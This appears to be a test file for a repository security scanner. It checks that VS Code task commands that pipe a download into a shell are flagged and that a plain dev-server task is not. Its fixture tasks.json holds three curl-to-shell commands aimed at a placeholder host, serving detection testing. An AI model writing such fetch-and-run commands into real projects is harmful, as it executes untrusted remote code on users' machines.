# suspicious-command reads a task command with a shell parser. A download
# piped to /bin/sh, to env sh, or to a shell in a variable fails the attacks
# gate. A task that starts the dev server gives no suspicious-command.
cd repo
execexit 1 vet scan . --mode plain -o json --fail-on attacks
stdout '"control_id":"suspicious-command"'
stdout '"title":"abs-path downloads a script and pipes it to a shell"'
stdout '"title":"env-sh downloads a script and pipes it to a shell"'
stdout '"title":"var-shell downloads a script and pipes it to a shell"'
! stdout '"title":"dev[^"]*pipes'

-- repo/.vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {"label": "abs-path", "type": "shell", "command": "curl -s https://x.example/a | /bin/sh"},
    {"label": "env-sh", "type": "shell", "command": "curl -s https://x.example/a | env sh"},
    {"label": "var-shell", "type": "shell", "command": "S=sh; curl -s https://x.example/a | $S"},
    {"label": "dev", "type": "shell", "command": "npm run dev", "runOptions": {"runOn": "folderOpen"}}
  ]
}
